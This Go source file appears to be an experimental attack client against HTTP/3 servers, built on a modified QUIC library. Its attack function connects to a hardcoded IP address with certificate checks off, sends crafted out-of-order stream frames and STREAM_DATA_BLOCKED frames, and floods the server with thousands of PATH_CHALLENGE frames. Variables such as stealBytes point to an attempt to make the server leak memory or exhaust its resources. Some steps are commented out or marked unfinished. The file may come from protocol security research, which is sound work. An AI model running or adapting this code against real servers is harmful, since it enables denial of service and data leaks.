package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/k4ra5u/quic-go"
	"github.com/k4ra5u/quic-go/internal/protocol"
	"github.com/k4ra5u/quic-go/internal/wire"
	"github.com/quic-go/qpack"
)

type Header struct{ Name, Value string }
type Headers []Header

type HTTPMessage struct {
	Headers Headers
	Body    []byte
}

const addr = "localhost:4242"

// Start a server that echos all data on the first stream opened by the client
func echoServer() error {
	listener, err := quic.ListenAddr(addr, generateTLSConfig(), nil)
	if err != nil {
		return err
	}
	defer listener.Close()

	conn, err := listener.Accept(context.Background())
	if err != nil {
		return err
	}

	stream, err := conn.AcceptStream(context.Background())
	if err != nil {
		panic(err)
	}
	defer stream.Close()

	// Echo through the loggingWriter
	_, err = io.Copy(loggingWriter{stream}, stream)
	return err
}

var keyLog io.Writer

func main() {
	//go func() { log.Fatal(echoServer()) }()

	keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"

	if len(keyLogFile) > 0 {
		f, err := os.Create(keyLogFile)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		keyLog = f
	}

	args := []string{"localhost", "183.173.168.115"}
	if len(args) != 2 {
		log.Fatalf("usage: %v <domain> <ip>", os.Args[0])
	}
	targetAddr := args[1]
	if _, _, err := net.SplitHostPort(targetAddr); err != nil {
		targetAddr = net.JoinHostPort(targetAddr, "58443")
	}
	serverName := args[0]
	println(serverName)

	prefix := []byte("")
	suffix := []byte("")
	stealBytes := 20000

	req := &HTTPMessage{
		Headers: []Header{
			{":method", "POST"},
			{":path", "/demo/echo"},
			{":authority", serverName},
			{":scheme", "https"},
			{"user-agent", "Mozilla/5.0"},
		},
		Body: nil,
	}

	resp, err := attack(targetAddr, serverName, req, prefix, suffix, stealBytes)
	if err != nil {
		log.Fatalf("Error: %#v", err)
	}

	for _, h := range resp.Headers {
		fmt.Printf("%v: %v\n", h.Name, h.Value)
	}
	//fmt.Println()
	//fmt.Printf("%s\n", resp.Body)
}

func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix []byte, stealBytes int) (response *HTTPMessage, err error) {
	//flushSize := 16879669
	//flushSize := 1024 * 4
	//flushSize := 1024 * 100
	flushSize := 984575 - 4000
	//33601296

	if len(prefix) >= flushSize {
		return nil, fmt.Errorf("len(prefix) > %v", flushSize)
	}
	if len(suffix) > 1000 {
		return nil, fmt.Errorf("len(suffix) > 1000")
	}

	address := connectAddr
	if _, _, err := net.SplitHostPort(connectAddr); err != nil {
		address = net.JoinHostPort(address, "6121")
	}

	name, port, err := net.SplitHostPort(address)
	if err != nil {
		return nil, fmt.Errorf("invalid address %v: %w", address, err)
	}

	ip, err := net.LookupIP(name)
	if err != nil {
		return nil, fmt.Errorf("lookup for %v failed: %w", name, err)
	}
	portInt, err := strconv.Atoi(port)
	if err != nil {
		return nil, fmt.Errorf("invalid port: %w", err)
	}

	udpConn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		return nil, err
	}
	defer func() { _ = udpConn.Close() }()

	ctx, cancel := context.WithTimeout(context.Background(), 1000*time.Second)
	defer cancel()
	go func() {
		<-ctx.Done()
		_ = udpConn.Close()
	}()

	udpAddr := &net.UDPAddr{
		IP:   ip[0],
		Port: portInt,
	}

	session, err := quic.Dial(ctx, udpConn, udpAddr,
		&tls.Config{
			NextProtos:         []string{"h3"},
			InsecureSkipVerify: true,
			KeyLogWriter:       keyLog,
		},
		&quic.Config{
			Versions:           []quic.VersionNumber{quic.Version1},
			MaxIncomingStreams: -1,
		})

	if err != nil {
		return nil, err
	}

	defer func() { _ = session.CloseWithError(0, "") }()

	if err := setupSession(session); err != nil {
		return nil, err
	}

	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	//构造前序的数据包：1024*100
	firstRange := bytes.NewBuffer(nil)
	requestHeaders := request.Headers
	requestHeaders = append(requestHeaders, Header{
		Name:  "content-length",
		Value: strconv.Itoa(flushSize + stealBytes + len(suffix) + 1),
	})
	//firstRange.Write(encodeHeaders(requestHeaders))
	//firstRange.Write(encodeBodyHeader(flushSize))
	//firstRange.Write(prefix)
	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-len(prefix)-1))

	//stolenBytesWithSuffix := stealBytes + len(suffix) + 1
	//flushFrameContent := append([]byte("L"), encodeBodyHeader(stolenBytesWithSuffix)...)
	flushFrameContent := bytes.Repeat([]byte("A"), 1024)
	finFrameContent := append([]byte("S"), suffix...)

	flushByteOffset := firstRange.Len()
	//flushByteOffset = 1308254
	flushByteOffset = 2680
	firstStolenByteOffset := flushByteOffset + len(flushFrameContent)
	finFrameOffset := firstStolenByteOffset + stealBytes
	totalSize := finFrameOffset + len(finFrameContent)
	totalSize = totalSize + 1

	finFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(finFrameOffset),
		Data:           finFrameContent,
		Fin:            true,
		DataLenPresent: true,
	}

	blocked_frame := &wire.StreamDataBlockedFrame{
		StreamID:          0,
		MaximumStreamData: 984575,
	}
	frames := []wire.Frame{
		blocked_frame,
		//flushFrame,
		//finFrame,
		//resetFrame,
	}
	/*
		resetFrame := &wire.ResetStreamFrame{
			StreamID:  0,
			ErrorCode: 0,
			FinalSize: protocol.ByteCount(totalSize),
		}
		reset_frame := []wire.Frame{
			resetFrame,
		}
	*/
	fin_frame := []wire.Frame{
		finFrame,
	}

	//send first padding bytes
	//发送前序的数据包：1024*100
	_, _ = requestStream.Write(firstRange.Bytes())
	//log.Printf(hex.EncodeToString(firstRange.Bytes()))
	log.Printf("frames with headers and prefix sent")
	time.Sleep(time.Second)
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
	var (
		headers Headers
		body    []byte
	)

	//发送第一个STRAM_DATA_BLOCKED
	blocked_frame = &wire.StreamDataBlockedFrame{
		StreamID:          0,
		MaximumStreamData: 984575,
	}
	frames = []wire.Frame{
		blocked_frame,
	}
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
	time.Sleep(time.Second)

	//发送一个固定偏移的包，之后发送STREAM_DATA_BLOCKED
	//每次发包的偏移都不同，还没写好
	/*
		for i := 0; i < 1; i++ {

			flushByteOffset = 204852
			flushFrame := &wire.StreamFrame{
				StreamID:       0,
				Offset:         protocol.ByteCount(flushByteOffset),
				Data:           flushFrameContent,
				Fin:            false,
				DataLenPresent: true,
			}
			flush_frame := []wire.Frame{
				flushFrame,
			}
			//send jumped bytes
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
			time.Sleep(time.Second)

			//发送第一个STRAM_DATA_BLOCKED
			blocked_frame = &wire.StreamDataBlockedFrame{
				StreamID:          0,
				MaximumStreamData: 524288,
			}
			frames = []wire.Frame{
				blocked_frame,
			}
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
			time.Sleep(time.Second)

		}
	*/

	//发送第二轮：在1048576-10240的位置发送1024个字节
	startPos := 1308254 - 10240
	for i := 0; i < 10; i++ {
		flushFrame := &wire.StreamFrame{
			StreamID:       0,
			Offset:         protocol.ByteCount(startPos),
			Data:           flushFrameContent,
			Fin:            false,
			DataLenPresent: true,
		}
		flush_frame := []wire.Frame{
			flushFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
		startPos += 1024
	}

	time.Sleep(time.Second)

	//发送第二轮：发送1308254偏移的STREAM_DATA_BLOCKED
	blocked_frame = &wire.StreamDataBlockedFrame{
		StreamID:          0,
		MaximumStreamData: 1308254,
	}
	frames = []wire.Frame{
		blocked_frame,
	}
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
	//time.Sleep(time.Second * 25)

	//发送PATH_CHALLENGE帧
	randomBytes := make([]byte, 8)

	for i := 0; i < 33; i++ {
		rand.Read(randomBytes)
		var randomBytesArray [8]byte
		copy(randomBytesArray[:], randomBytes)
		path_challengeFrame := &wire.PathChallengeFrame{
			Data: randomBytesArray,
		}
		path_challenge_frame := []wire.Frame{
			path_challengeFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
		time.Sleep(time.Second)

	}

	for i := 0; i < 5987; i++ {
		rand.Read(randomBytes)
		var randomBytesArray [8]byte
		copy(randomBytesArray[:], randomBytes)
		path_challengeFrame := &wire.PathChallengeFrame{
			Data: randomBytesArray,
		}
		path_challenge_frame := []wire.Frame{
			path_challengeFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
		time.Sleep(time.Nanosecond * 480)
	}

	/*

		//发送ping帧
		ping_frame := &wire.PingFrame{}
		pingFrame := []wire.Frame{
			ping_frame,
		}
		for i := 0; i < 0; i++ {
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
			time.Sleep(time.Microsecond)
		}

		ccf := &wire.ConnectionCloseFrame{
			ErrorCode:          0,
			ReasonPhrase:       "foobar",
			IsApplicationError: false,
		}
		CCframe := []wire.Frame{
			ccf,
			//flushFrame,
			//finFrame,
			//resetFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(CCframe)
	*/

	/*
		ConnectionID, _ := protocol.GenerateConnectionIDForInitial()
		new_CID := &wire.NewConnectionIDFrame{
			SequenceNumber: uint64(10),
			//RetirePriorTo:  uint64(1),
			ConnectionID: ConnectionID,
			//StatelessResetToken: protocol.StatelessResetToken{0xe, 0xd, 0xc, 0xb, 0xa, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0},
		}
		newCID := []wire.Frame{
			new_CID,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(newCID)
		time.Sleep(time.Microsecond)
	*/

	//发送size_konwn的stream帧
	//requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
	//time.Sleep(time.Microsecond)

	//requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(reset_frame)

	//发送RETIRE_CONNECTION_ID帧

	//发送第三轮：在1048576-10240的位置发送1024个字节
	/*

		flushByteOffset = 1048576 - 10240
		flushFrame := &wire.StreamFrame{
			StreamID:       0,
			Offset:         protocol.ByteCount(flushByteOffset),
			Data:           flushFrameContent,
			Fin:            false,
			DataLenPresent: true,
		}
		flush_frame := []wire.Frame{
			flushFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
		time.Sleep(time.Second)

		blocked_frame = &wire.StreamDataBlockedFrame{
			StreamID:          0,
			MaximumStreamData: 2048576,
		}
		frames = []wire.Frame{
			blocked_frame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)

		//requestStream.Write(firstRange.Bytes())
		time.Sleep(time.Second)
	*/

	time.Sleep(time.Second * 20)
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)

	decoder := qpack.NewDecoder(func(f qpack.HeaderField) {
		headers = append(headers, Header{
			Name:  f.Name,
			Value: f.Value,
		})
	})
	frameBuffer := bufio.NewReader(requestStream)
	//frameBuffer = bufio.NewReader(requestStream)
	for {
		frame, err := readFrame(frameBuffer)
		if err != nil {
			if ctx.Err() != nil {
				return nil, fmt.Errorf("timeout error")
			}

			if err == io.EOF {
				break
			}

			if qErr, ok := err.(interface{ IsApplicationError() bool }); ok {
				if qErr.IsApplicationError() {
					return nil, fmt.Errorf("connection dropped: %v", qErr)
				}
			}
			return nil, err
		}
		switch frame.Type {
		case 0x0:
			body = append(body, frame.Data...)
		case 0x1:
			if _, err := decoder.Write(frame.Data); err != nil {
				return nil, err
			}
		default:
			// ignore unknown frame types for now
		}
	}
	return &HTTPMessage{
		Headers: headers,
		Body:    body,
	}, nil
}

type http3Frame struct {
	Type int
	Len  uint64
	Data []byte
}

func readFrame(b *bufio.Reader) (*http3Frame, error) {
	t, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	l, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	data := make([]byte, l)
	if _, err := io.ReadFull(b, data); err != nil {
		return nil, err
	}
	return &http3Frame{
		Type: int(t),
		Len:  l,
		Data: data,
	}, nil
}

func encodeHeaders(headers Headers) []byte {
	qpackBuf := bytes.NewBuffer(nil)
	e := qpack.NewEncoder(qpackBuf)
	for _, h := range headers {
		_ = e.WriteField(qpack.HeaderField{Name: h.Name, Value: h.Value})
	}
	headersFrame := bytes.NewBuffer(nil)
	writeVarInt(headersFrame, 0x1)
	writeVarInt(headersFrame, uint64(qpackBuf.Len()))
	headersFrame.Write(qpackBuf.Bytes())
	return headersFrame.Bytes()
}

func encodeBodyHeader(size int) (frame []byte) {
	buf := bytes.NewBuffer(nil)
	writeVarInt(buf, 0x00)
	writeVarInt(buf, uint64(size))
	return buf.Bytes()
}

func setupSession(session quic.Connection) error {
	str, err := session.OpenUniStream()
	if err != nil {
		return err
	}
	buf := &bytes.Buffer{}
	buf.Write([]byte{0x0, 0x4, 0x0}) // TODO: this is shit
	if _, err := str.Write(buf.Bytes()); err != nil {
		return err
	}
	return nil
}

const (
	maxVarInt1 = 63
	maxVarInt2 = 16383
	maxVarInt4 = 1073741823
	maxVarInt8 = 4611686018427387903
)

func readVarInt(b io.ByteReader) (uint64, error) {
	firstByte, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	// the first two bits of the first byte encode the length
	intLen := 1 << ((firstByte & 0xc0) >> 6)
	b1 := firstByte & (0xff - 0xc0)
	if intLen == 1 {
		return uint64(b1), nil
	}
	b2, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 2 {
		return uint64(b2) + uint64(b1)<<8, nil
	}
	b3, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b4, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 4 {
		return uint64(b4) + uint64(b3)<<8 + uint64(b2)<<16 + uint64(b1)<<24, nil
	}
	b5, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b6, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b7, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b8, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	return uint64(b8) + uint64(b7)<<8 + uint64(b6)<<16 + uint64(b5)<<24 + uint64(b4)<<32 + uint64(b3)<<40 + uint64(b2)<<48 + uint64(b1)<<56, nil
}

func writeVarInt(b *bytes.Buffer, i uint64) {
	if i <= maxVarInt1 {
		b.WriteByte(uint8(i))
	} else if i <= maxVarInt2 {
		b.Write([]byte{uint8(i>>8) | 0x40, uint8(i)})
	} else if i <= maxVarInt4 {
		b.Write([]byte{uint8(i>>24) | 0x80, uint8(i >> 16), uint8(i >> 8), uint8(i)})
	} else if i <= maxVarInt8 {
		b.Write([]byte{
			uint8(i>>56) | 0xc0, uint8(i >> 48), uint8(i >> 40), uint8(i >> 32),
			uint8(i >> 24), uint8(i >> 16), uint8(i >> 8), uint8(i),
		})
	} else {
		panic(fmt.Sprintf("%#x doesn't fit into 62 bits", i))
	}
}

// A wrapper for io.Writer that also logs the message.
type loggingWriter struct{ io.Writer }

func (w loggingWriter) Write(b []byte) (int, error) {
	fmt.Printf("Server: Got '%s'\n", string(b))
	return w.Writer.Write(b)
}

// Setup a bare-bones TLS config for the server
func generateTLSConfig() *tls.Config {
	key, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		panic(err)
	}
	template := x509.Certificate{SerialNumber: big.NewInt(1)}
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		panic(err)
	}
	return &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		NextProtos:   []string{"quic-echo-example"},
	}
}
